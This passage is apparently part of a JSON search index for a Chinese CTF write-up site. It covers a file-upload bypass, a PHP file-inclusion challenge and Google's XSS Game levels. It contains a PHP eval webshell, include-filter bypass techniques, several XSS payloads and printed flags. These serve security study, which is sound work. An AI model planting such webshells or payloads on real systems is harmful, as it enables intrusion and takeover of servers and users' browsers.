Flag","title":"\u89e3\u9898\u601d\u8def"},{"location":"web/t_star_tomcat/#_2","text":"Tomcat \u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u6f0f\u6d1eCVE-2017-12615\u590d\u73b0\u6d4b\u8bd5","title":"\u53c2\u8003\u8d44\u6599"},{"location":"web/t_star_upload_bypass/","text":"\u89e3\u9898\u601d\u8def \u00b6 \u9898\u76ee\u9700\u8981\u4e0a\u4f20\u4e00\u4e2a webshell \u5230\u670d\u52a1\u5668\uff0c\u4f46\u662f\u524d\u7aef\u6709 JS \u6821\u9a8c\uff0c\u5bfc\u81f4\u53ea\u80fd\u4e0a\u4f20\u56fe\u7247 hack.php 1 2 <?php @eval ( $_POST [ 'hack' ]) ; ?> # hack \u4e3a\u83dc\u5200\u8fde\u63a5\u4f7f\u7528\u7684\u5bc6\u7801 \u4f7f\u7528\u5f00\u53d1\u8005\u5de5\u5177\u5220\u9664 onsubmit \u4e2d\u8c03\u7528 checkFile() \u51fd\u6570\u7684\u8fc7\u7a0b\uff0c\u7136\u540e\u5c31\u53ef\u4ee5\u76f4\u63a5\u4e0a\u4f20 PHP \u6587\u4ef6 \u6253\u5f00\u83dc\u5200\uff0c\u6dfb\u52a0 SHELL \u8fde\u63a5\u540e\uff0c\u5728 www \u76ee\u5f55\u4e0b\u53ef\u4ee5\u770b\u5230\u540d\u4e3a key \u7684\u6587\u4ef6 \u5185\u5bb9\u5373\u4e3a FLAG\uff1a key{K735c9f0D7ddc3b9}","title":"\u6587\u4ef6\u4e0a\u4f20 JS \u7ed5\u8fc7"},{"location":"web/t_star_upload_bypass/#_1","text":"\u9898\u76ee\u9700\u8981\u4e0a\u4f20\u4e00\u4e2a webshell \u5230\u670d\u52a1\u5668\uff0c\u4f46\u662f\u524d\u7aef\u6709 JS \u6821\u9a8c\uff0c\u5bfc\u81f4\u53ea\u80fd\u4e0a\u4f20\u56fe\u7247 hack.php 1 2 <?php @eval ( $_POST [ 'hack' ]) ; ?> # hack \u4e3a\u83dc\u5200\u8fde\u63a5\u4f7f\u7528\u7684\u5bc6\u7801 \u4f7f\u7528\u5f00\u53d1\u8005\u5de5\u5177\u5220\u9664 onsubmit \u4e2d\u8c03\u7528 checkFile() \u51fd\u6570\u7684\u8fc7\u7a0b\uff0c\u7136\u540e\u5c31\u53ef\u4ee5\u76f4\u63a5\u4e0a\u4f20 PHP \u6587\u4ef6 \u6253\u5f00\u83dc\u5200\uff0c\u6dfb\u52a0 SHELL \u8fde\u63a5\u540e\uff0c\u5728 www \u76ee\u5f55\u4e0b\u53ef\u4ee5\u770b\u5230\u540d\u4e3a key \u7684\u6587\u4ef6 \u5185\u5bb9\u5373\u4e3a FLAG\uff1a key{K735c9f0D7ddc3b9}","title":"\u89e3\u9898\u601d\u8def"},{"location":"web/web_php_include/","text":"\u9898\u76ee \u00b6 1 2 3 4 5 6 7 8 9 <?php show_source(__FILE__); echo $_GET['hello']; $page=$_GET['page']; while (strstr($page, \"php://\")) { $page=str_replace(\"php://\", \"\", $page); } include($page); ?> \u89e3\u9898\u601d\u8def \u00b6 \u8fdc\u7a0b\u6587\u4ef6\u5305\u542b\uff0c\u5148\u67e5\u770b\u5f53\u524d\u76ee\u5f55\u4e0b\u7684\u6587\u4ef6\uff0c\u5229\u7528 Data URLs\uff0c\u53d1\u73b0\u53ef\u7591\u6587\u4ef6 fl4gisisish3r3.php \u60f3 cat \u4e00\u4e0b fl4gisisish3r3.php \uff0c\u7ed3\u679c\u8fd4\u56de 500 (\u2565\u03c9\u2565) \u5229\u7528 PHP \u6d41 filter Base64 \u89e3\u7801\u5f97 1 2 3 <?php $flag = \"ctf{876a5fca-96c6-4cbd-9075-46f0c89475d2}\" ; ?> \u53c2\u8003\u8d44\u6599 \u00b6 PHP Code Auditing - CTF Wiki","title":"Web php include"},{"location":"web/web_php_include/#_1","text":"1 2 3 4 5 6 7 8 9 <?php show_source(__FILE__); echo $_GET['hello']; $page=$_GET['page']; while (strstr($page, \"php://\")) { $page=str_replace(\"php://\", \"\", $page); } include($page); ?>","title":"\u9898\u76ee"},{"location":"web/web_php_include/#_2","text":"\u8fdc\u7a0b\u6587\u4ef6\u5305\u542b\uff0c\u5148\u67e5\u770b\u5f53\u524d\u76ee\u5f55\u4e0b\u7684\u6587\u4ef6\uff0c\u5229\u7528 Data URLs\uff0c\u53d1\u73b0\u53ef\u7591\u6587\u4ef6 fl4gisisish3r3.php \u60f3 cat \u4e00\u4e0b fl4gisisish3r3.php \uff0c\u7ed3\u679c\u8fd4\u56de 500 (\u2565\u03c9\u2565) \u5229\u7528 PHP \u6d41 filter Base64 \u89e3\u7801\u5f97 1 2 3 <?php $flag = \"ctf{876a5fca-96c6-4cbd-9075-46f0c89475d2}\" ; ?>","title":"\u89e3\u9898\u601d\u8def"},{"location":"web/web_php_include/#_3","text":"PHP Code Auditing - CTF Wiki","title":"\u53c2\u8003\u8d44\u6599"},{"location":"web/xss_game/","text":"Level 1: Hello, world of XSS \u00b6 Level 2: Persistence is key \u00b6 \u4ece\u7b2c\u4e00\u7bc7\u535a\u5ba2\u53ef\u4ee5\u770b\u51fa\u6765\uff0cHTML \u6807\u7b7e\u662f\u53ef\u7528\u7684\uff0c\u4f46 <script>alert(1)</script> \u5728\u672c\u5173\u4e0d\u8d77\u4f5c\u7528 \u5229\u7528\u6807\u7b7e\u4e8b\u4ef6\u5c5e\u6027\uff0c <img src=\"a\" onerror=\"alert(1)\"> Level 3: That sinking feeling... \u00b6 \u8bbf\u95ee\u5305\u542b\u6307\u5b9a\u56fe\u7247\u7684\u94fe\u63a5\u7531\u57fa\u7840\u94fe\u63a5 https://xss-game.appspot.com/level3/frame# \u548c\u56fe\u7247\u5e8f\u53f7\u7ec4\u6210\u3002\u8f93\u5165\u5e8f\u53f7 <hi>hi \u8fdb\u884c\u6d4b\u8bd5\uff0c\u53d1\u73b0\u8be5\u300e\u5e8f\u53f7\u300f\u76f4\u63a5\u62fc\u63a5\u5230\u4e86 <img> \u6807\u7b7e\u7684 src \u5c5e\u6027\u4e2d \u4e0d\u8fc7\u9700\u8981\u6ce8\u610f\u53ea\u6709\u5355\u5f15\u53f7\u624d\u53ef\u4ee5\u622a\u65ad\uff0c\u67e5\u770b JS \u4ee3\u7801\u53ef\u77e5 \u5355\u5f15\u53f7\u622a\u65ad\uff0c\u63d2\u5165 onerror \u5c5e\u6027\uff0c\u5b8c\u6210\u5f39\u6846 Level 4: Context matters \u00b6 \u63d0\u4ea4\u4e00\u4e2a\u6574\u6570\uff0c\u4f1a\u542f\u52a8\u4e00\u4e2a\u8ba1\u65f6\u5668\u5e76\u5728\u6574\u6570\uff08\u63d0\u4ea4\u7684\u6574\u6570\uff09\u79d2\u540e\u5f39\u6846\uff0c\u63d0\u793a\u300e\u8ba1\u65f6\u7ed3\u675f\u300f \u67e5\u770b\u6e90\u7801\uff0c\u6ce8\u610f\u5230 1 < img src = \"/static/loading.gif\" onload = \"startTimer('{{ timer }}');\" /> \u63d0\u4ea4\u4e00\u4e2a\u5355\u5f15\u53f7 ' \uff0c\u63a7\u5236\u53f0\u4f1a\u62a5\u9519\uff0c\u610f\u5473\u7740\u9003\u9038\u7684\u53ef\u80fd\u6027 \u4e8b\u4ef6\u5c5e\u6027\u4e2d\u53ef\u4ee5\u6dfb\u52a0\u591a\u4e2a\u51fd\u6570\uff0c\u5728 onload \u4e8b\u4ef6\u5c5e\u6027\u4e2d\u518d\u585e\u4e00\u4e2a alert \u51fd\u6570\u5c31\u53ef\u4ee5\u4e86\u5495\uff01 Level 5: Breaking protocol \u00b6 \u5171\u4e09\u4e2a\u754c\u9762\uff1a\u4e3b\u754c\u9762\u3001\u6ce8\u518c\u754c\u9762\u548c\u6ce8\u518c\u5b8c\u6210\u63d0\u793a\u8df3\u8f6c\u7684\u754c\u9762 \u6ce8\u518c\u754c\u9762\u7684 URL \u5305\u542b\u53c2\u6570 next \uff0c\u540c\u65f6\u6ce8\u518c\u754c\u9762\u7684 Next >> \u6309\u94ae\u7684 href \u5c5e\u6027\u7684\u503c\u7531\u8be5\u53c2\u6570\u51b3\u5b9a 1 2 3 4 5 6 7 # part of level.py if \"signup\" in self . request . path : self . render_template ( 'signup.html' , { 'next' : self . request . get ( 'next' )}) # part of signup.html < a href = \"{{ next }}\" > Next >></ a > href \u5c5e\u6027\u53ef\u4ee5\u94fe\u63a5 JS\u3002\u8bbf\u95ee https://xss-game.appspot.com/level5/frame/signup?next=javascript:alert(1 )\uff0c\u5e76\u70b9\u51fb Next >> \u53ef\u5f39\u6846 Level 6: Follow the \ud83d\udc07 \u00b6 \u8bbf\u95ee\u6587\u4ef6\u7684\u6587\u4ef6\u540d\u662f\u901a\u8fc7\u8bbf\u95ee URL \u4e2d # \u540e\u7684\u5b57\u7b26\u4e32\u51b3\u5b9a\uff0c\u622a\u53d6\u5b57\u7b26\u4e32\u540e\u4f20\u9012\u7ed9 includeGadget \u51fd\u6570\u505a\u540e\u7eed\u5904\u7406 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 // Take the value after # and use it as the gadget filename. function getGadgetName() { return window.location.hash.substr(1) || \"/static/gadget.js\"; } includeGadget(getGadgetName()); function includeGadget(url) { // \u521b\u5efa\u4e00\u4e2a script \u6807\u7b7e var scriptEl = document.createElement('script'); // This will totally prevent us from loading evil URLs! // \u53ea\u5339\u914d\u5c0f\u5199\uff0c\u5927\u5199\u5373\u53ef\u7ed5\u8fc7 if (url.match(/^https?:\\/\\//)) { setInnerText(document.getElementById(\"log\"), \"Sorry, cannot load a URL containing \\\"http\\\".\"); return; } // Load this awesome gadget scriptEl.src = url; // Show log messages scriptEl.onload = function() { setInnerText(document.getElementById(\"log\"), \"Loaded gadget from \" + url); } scriptEl.onerror = function() { setInnerText(document.getElementById(\"log\"), \"Couldn't load gadget from \" + url); } // \u63d2\u5165\u5230 head \u4e2d document.head.appendChild(scriptEl); } <script> \u6807\u7b7e\u7684 src \u5c5e\u6027\u7684\u503c\u53ef\u4ee5\u662f\u6307\u5411 JS \u6587\u4ef6\u7684 URL\uff0c\u7edd\u5bf9\u8def\u5f84\u6216\u76f8\u5bf9\u8def\u5f84\uff0c\u6216\u4f7f\u7528 Data URLs \u3010\u66f4\u65b9\u4fbf\u3011 \u901a\u8fc7\u6307\u5411 JS \u6587\u4ef6\u7684 URL \u89e6\u53d1\uff0c\u4f7f\u7528\u5495\u679c\u7684 JSAPI \u901a\u8fc7 Data URLs \u89e6\u53d1\uff0c MIME type \u7684\u503c\u4e0d\u5f71\u54cd \u53c2\u8003\u8d44\u6599 \u00b6 Data URLs - HTTP | MDN","title":"XSS Game"},{"location":"web/xss_game/#level-1-hello-world-of-xss","text":"","title":"Level 1: Hello, world of XSS"},{"location":"web/xss_game/#level-2-persistence-is-key","text":"\u4ece\u7b2c\u4e00\u7bc7\u535a\u5ba2\u53ef\u4ee5\u770b\u51fa\u6765\uff0cHTML \u6807\u7b7e\u662f\u53ef\u7528\u7684\uff0c\u4f46 <script>alert(1)</script> \u5728\u672c\u5173\u4e0d\u8d77\u4f5c\u7528 \u5229\u7528\u6807\u7b7e\u4e8b\u4ef6\u5c5e\u6027\uff0c <img src=\"a\" onerror=\"alert(1)\">","title":"Level 2: Persistence is key"},{"location":"web/xss_game/#level-3-that-sinking-feeling","text":"\u8bbf\u95ee\u5305\u542b\u6307\u5b9a\u56fe\u7247\u7684\u94fe\u63a5\u7531\u57fa\u7840\u94fe\u63a5 https://xss-game.appspot.com/level3/frame# \u548c\u56fe\u7247\u5e8f\u53f7\u7ec4\u6210\u3002\u8f93\u5165\u5e8f\u53f7 <hi>hi \u8fdb\u884c\u6d4b\u8bd5\uff0c\u53d1\u73b0\u8be5\u300e\u5e8f\u53f7\u300f\u76f4\u63a5\u62fc\u63a5\u5230\u4e86 <img> \u6807\u7b7e\u7684 src \u5c5e\u6027\u4e2d \u4e0d\u8fc7\u9700\u8981\u6ce8\u610f\u53ea\u6709\u5355\u5f15\u53f7\u624d\u53ef\u4ee5\u622a\u65ad\uff0c\u67e5\u770b JS \u4ee3\u7801\u53ef\u77e5 \u5355\u5f15\u53f7\u622a\u65ad\uff0c\u63d2\u5165 onerror \u5c5e\u6027\uff0c\u5b8c\u6210\u5f39\u6846","title":"Level 3: That sinking feeling..."},{"location":"web/xss_game/#level-4-context-matters","text":"\u63d0\u4ea4\u4e00\u4e2a\u6574\u6570\uff0c\u4f1a\u542f\u52a8\u4e00\u4e2a\u8ba1\u65f6\u5668\u5e76\u5728\u6574\u6570\uff08\u63d0\u4ea4\u7684\u6574\u6570\uff09\u79d2\u540e\u5f39\u6846\uff0c\u63d0\u793a\u300e\u8ba1\u65f6\u7ed3\u675f\u300f \u67e5\u770b\u6e90\u7801\uff0c\u6ce8\u610f\u5230 1 < img src = \"/static/loading.gif\" onload = \"startTimer('{{ timer }}');\" /> \u63d0\u4ea4\u4e00\u4e2a\u5355\u5f15\u53f7 ' \uff0c\u63a7\u5236\u53f0\u4f1a\u62a5\u9519\uff0c\u610f\u5473\u7740\u9003\u9038\u7684\u53ef\u80fd\u6027 \u4e8b\u4ef6\u5c5e\u6027\u4e2d\u53ef\u4ee5\u6dfb\u52a0\u591a\u4e2a\u51fd\u6570\uff0c\u5728 onload \u4e8b\u4ef6\u5c5e\u6027\u4e2d\u518d\u585e\u4e00\u4e2a alert \u51fd\u6570\u5c31\u53ef\u4ee5\u4e86\u5495\uff01","title":"Level 4: Context matters"},{"location":"web/xss_game/#level-5-breaking-protocol","text":"\u5171\u4e09\u4e2a\u754c\u9762\uff1a\u4e3b\u754c\u9762\u3001\u6ce8\u518c\u754c\u9762\u548c\u6ce8\u518c\u5b8c\u6210\u63d0\u793a\u8df3\u8f6c\u7684\u754c\u9762 \u6ce8\u518c\u754c\u9762\u7684 URL \u5305\u542b\u53c2\u6570 next \uff0c\u540c\u65f6\u6ce8\u518c\u754c\u9762\u7684 Next >> \u6309\u94ae\u7684 href \u5c5e\u6027\u7684\u503c\u7531\u8be5\u53c2\u6570\u51b3\u5b9a 1 2 3 4 5 6 7 # part of level.py if \"signup\" in self . request . path : self . render_template ( 'signup.html' , { 'next' : self . request . get ( 'next' )}) # part of signup.html < a href = \"{{ next }}\" > Next >></ a > href \u5c5e\u6027\u53ef\u4ee5\u94fe\u63a5 JS\u3002\u8bbf\u95ee https://xss-game.appspot.com/level5/frame/signup?next=javascript:alert(1 )\uff0c\u5e76\u70b9\u51fb Next >> \u53ef\u5f39\u6846","title":"Level 5: Breaking protocol"},{"location":"web/xss_game/#level-6-follow-the","text":"\u8bbf\u95ee\u6587\u4ef6\u7684\u6587\u4ef6\u540d\u662f\u901a\u8fc7\u8bbf\u95ee URL \u4e2d # \u540e\u7684\u5b57\u7b26\u4e32\u51b3\u5b9a\uff0c\u622a\u53d6\u5b57\u7b26\u4e32\u540e\u4f20\u9012\u7ed9 includeGadget \u51fd\u6570\u505a\u540e\u7eed\u5904\u7406 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 // Take the value after # and use it as the gadget filename. function getGadgetName() { return window.location.hash.substr(1) || \"/static/gadget.js\"; } includeGadget(getGadgetName()); function includeGadget(url) { // \u521b\u5efa\u4e00\u4e2a script \u6807\u7b7e var scriptEl = document.createElement('script'); // This will totally prevent us from loading evil URLs! // \u53ea\u5339\u914d\u5c0f\u5199\uff0c\u5927\u5199\u5373\u53ef\u7ed5\u8fc7 if (url.match(/^https?:\\/\\//)) { setInnerText(document.getElementById(\"log\"), \"Sorry, cannot load a URL containing \\\"http\\\".\"); return; } // Load this awesome gadget scriptEl.src = url; // Show log messages scriptEl.onload = function() { setInnerText(document.getElementById(\"log\"), \"Loaded gadget from \" + url); } scriptEl.onerror = function() { setInnerText(document.getElementById(\"log\"), \"Couldn't load gadget from \" + url); } // \u63d2\u5165\u5230 head \u4e2d document.head.appendChild(scriptEl); } <script> \u6807\u7b7e\u7684 src \u5c5e\u6027\u7684\u503c\u53ef\u4ee5\u662f\u6307\u5411 JS \u6587\u4ef6\u7684 URL\uff0c\u7edd\u5bf9\u8def\u5f84\u6216\u76f8\u5bf9\u8def\u5f84\uff0c\u6216\u4f7f\u7528 Data URLs \u3010\u66f4\u65b9\u4fbf\u3011 \u901a\u8fc7\u6307\u5411 JS \u6587\u4ef6\u7684 URL \u89e6\u53d1\uff0c\u4f7f\u7528\u5495\u679c\u7684 JSAPI \u901a\u8fc7 Data URLs \u89e6\u53d1\uff0c MIME type \u7684\u503c\u4e0d\u5f71\u54cd","title":"Level 6: Follow the \ud83d\udc07"},{"location":"web/xss_game/#_1","text":"Data URLs - HTTP | MDN","title":"\u53c2\u8003\u8d44\u6599"}]}